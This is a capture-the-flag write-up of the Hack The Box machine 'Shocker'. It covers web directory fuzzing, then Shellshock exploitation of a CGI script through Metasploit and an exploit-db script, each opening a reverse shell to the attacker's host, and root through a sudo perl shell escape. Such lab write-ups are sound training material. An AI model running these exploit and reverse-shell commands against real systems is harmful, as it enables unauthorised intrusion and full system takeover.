# Shocker-HTB
Shocker is a Linux machine that is rated as easy, we can get a shell by using Metasploit or by using a exploit-db exploit

# Recon
I started by runing nmap scan on the machine.
```
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -sC -sV  10.10.10.56
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-25 22:00 EDT
Nmap scan report for 10.10.10.56
Host is up (0.045s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.76 seconds
```
## ffuf
I will be using ffuf to fuze web directories.
```
┌──(kali㉿kali)-[~/Desktop]
└─$ ./ffuf -w /usr/share/wordlists/wfuzz/general/big.txt -u http://10.10.10.56/FUZZ 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.56/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/wfuzz/general/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

cgi-bin/                [Status: 403, Size: 294, Words: 22, Lines: 12]
:: Progress: [3024/3024] :: Job [1/1] :: 1512 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```
So we need to fuzz more inside ```cgi-bin```. After a long time of fuzzing I was able to find the file:
```
┌──(kali㉿kali)-[~/Desktop]
└─$ ./ffuf -w big.txt -u http://10.10.10.56/cgi-bin/FUZZ.sh          

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.56/cgi-bin/FUZZ.sh
 :: Wordlist         : FUZZ: big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

user                    [Status: 200, Size: 119, Words: 19, Lines: 8]
:: Progress: [3025/3025] :: Job [1/1] :: 1512 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```
So there is a file called ```user.sh```. At this point there is 2 ways to get a shell, by using Metasploit or by using a exploit-db exploit.

## Metasploit
Module: ```exploit/multi/http/apache_mod_cgi_bash_env_exec```

Proof:
```
msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > options 

Module options (exploit/multi/http/apache_mod_cgi_bash_env_exec):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   CMD_MAX_LENGTH  2048             yes       CMD max line length
   CVE             CVE-2014-6271    yes       CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278)
   HEADER          User-Agent       yes       HTTP header to use
   METHOD          GET              yes       HTTP method to use
   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                           yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPATH           /bin             yes       Target PATH for binaries used by the CmdStager
   RPORT           80               yes       The target port (TCP)
   SRVHOST         0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT         8080             yes       The local port to listen on.
   SSL             false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                          no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI                        yes       Path to CGI script
   TIMEOUT         5                yes       HTTP read response timeout (seconds)
   URIPATH                          no        The URI to use for this exploit (default is random)
   VHOST                            no        HTTP server virtual host


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.28      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Linux x86


msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set RHOSTS 10.10.10.56
RHOSTS => 10.10.10.56
msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set TARGETURI /cgi-bin/user.sh
TARGETURI => /cgi-bin/user.sh
msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit

[*] Started reverse TCP handler on 10.10.14.28:4444 
[*] Command Stager progress - 100.46% done (1097/1092 bytes)
[*] Sending stage (980808 bytes) to 10.10.10.56
[*] Meterpreter session 1 opened (10.10.14.28:4444 -> 10.10.10.56:59904) at 2020-08-25 22:21:01 -0400

meterpreter > getuid 
Server username: no-user @ Shocker (uid=1000, gid=1000, euid=1000, egid=1000)
```
## Exploit-db
Exploitation: https://www.exploit-db.com/exploits/34900

```
┌──(kali㉿kali)-[~/Desktop/HTB/Shocker]
└─$ python shellshock.py payload=reverse rhost=10.10.10.56 lhost=10.10.14.28 lport=5555 pages=/cgi-bin/user.sh
[!] Started reverse shell handler
[-] Trying exploit on : /cgi-bin/user.sh
[!] Successfully exploited
[!] Incoming connection from 10.10.10.56
10.10.10.56> id
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare) 
```

# User Flag
Get the User flag:
```
10.10.10.56> cat user.txt
2ec24e11...3e16695b233
```

# Root Flag
By runing ```sudo -l``` we can see that we can run ```perl``` with sudo.
```
10.10.10.56> sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```
To get a root shell you just need to run this command ```sudo /usr/bin/perl -e 'exec "/bin/sh"' ```
```
10.10.10.56> sudo /usr/bin/perl -e 'exec "/bin/sh"'
10.10.10.56> id
uid=0(root) gid=0(root) groups=0(root)
```
And we can get root flag :)
```
10.10.10.56> cat root.txt
52c271560...60dc1ca467
```

Note: you can find more like this command ```sudo /usr/bin/perl -e 'exec "/bin/sh"' ``` from https://gtfobins.github.io/

Thank you for reading, and you can find me here on twitter: https://twitter.com/electronicbots
